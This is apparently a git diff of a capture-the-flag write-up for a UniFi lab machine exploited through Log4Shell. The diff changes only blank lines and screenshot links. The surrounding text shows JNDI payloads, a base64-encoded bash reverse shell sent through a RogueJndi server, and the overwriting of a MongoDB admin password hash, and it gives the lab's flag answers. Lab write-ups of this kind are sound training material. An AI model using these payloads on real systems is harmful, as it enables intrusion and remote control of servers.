@@ -45,6 +45,7 @@ Q7: What port do we need to inspect intercepted traffic for?
 A: 389
 
 It looks like ldap traffic goes to port 389
+
 ![](../../Img/Pasted%20image%2020250424155244.png)
 
 
@@ -54,17 +55,26 @@ A: 27117
 
 So, according to this article (https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi) in the remember parameter goes a payload ("${jndi:ldap://eb0uvi.dnslog.cn:1389/o=tomcat}\"), but as i'm not using that tool (dnslog.cn) i just use my ip and tcpdump
 I get an error
+
 ![](../../Img/Pasted%20image%2020250424160606.png)
+
 but also a connection
+
 ![](../../Img/Pasted%20image%2020250424160627.png)
+
 With this command we can encrypt the payload for the jndi echo 'bash -c bash -i >&/dev/tcp/{ip}/3333 0>&1' | base64
 We insert that payload in the command for starting the jndi sv java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMTU3LzMzMzMgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.15.157"
+
 ![](../../Img/Pasted%20image%2020250424162840.png)
+
 in burp suite we replace the payload form the remember parameter with our new jdni port (${jndi:ldap://10.10.15.157/:1389/o=tomcat})
 we get the connection
+
 ![](../../Img/Pasted%20image%2020250424163652.png)
+
 Upgrade it (script /dev/null -c bash)
 Now finally for the question let's check if mongo is running (ps aux | grep mongo)
+
 ![](../../Img/Pasted%20image%2020250424163929.png)
 
 Q9: What is the default database name for UniFi applications?
@@ -72,7 +82,9 @@ Q9: What is the default database name for UniFi applications?
 A:  ace
 
 Before i had the genius ground breaking idea of just Googling it i connected to the mongo instance and listed the db
+
 ![](../../Img/Pasted%20image%2020250424164412.png)
+
 ![](../../Img/Pasted%20image%2020250424164226.png)
 
 Q10: What is the function we use to enumerate users within the database in MongoDB?
@@ -93,8 +105,11 @@ A: NotACrackablePassword4U2022
 
 I Chose the Shadow Admin method from the article. I created a pswd (qweqwe12345), sha-512 it, replace the one the admin had with (db.admin.update())
 and just log in
+
 ![](../../Img/Pasted%20image%2020250424170005.png)
+
 Now, in the Steal SSH Creds it says how to get the answer
+
 ![](../../Img/Pasted%20image%2020250424170142.png)
 
 Q13: Submit user flag
@@ -102,7 +117,9 @@ Q13: Submit user flag
 A: 6ced1a6a89e666c0620cdb10262ba127
 
 shh into it 
+
 ![](../../Img/Pasted%20image%2020250424170310.png)
+
 go find it
 
 ![](../../Img/Pasted%20image%2020250424170542.png)
@@ -112,6 +129,7 @@ Q14: Submit root flag
 A: e50bc93c75b634e4b272d2f771c33681
 
 Look for it 
+
 ![](../../Img/Pasted%20image%2020250424170430.png)
 
 
